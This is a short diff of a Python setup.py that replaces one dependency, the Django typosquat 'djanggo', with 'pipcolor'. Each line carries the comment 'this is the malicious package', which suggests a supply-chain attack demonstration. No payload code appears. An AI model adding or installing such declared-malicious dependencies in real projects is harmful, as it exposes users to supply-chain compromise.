@@ -8,7 +8,7 @@ setup(
     version='0.1.0',
     packages=find_packages(),
     install_requires=[
-        'djanggo==0.0.8',  # this is the malicious package
+        'pipcolor==0.0.1',  # this is the malicious package
     ],
     entry_points={
         'console_scripts': [
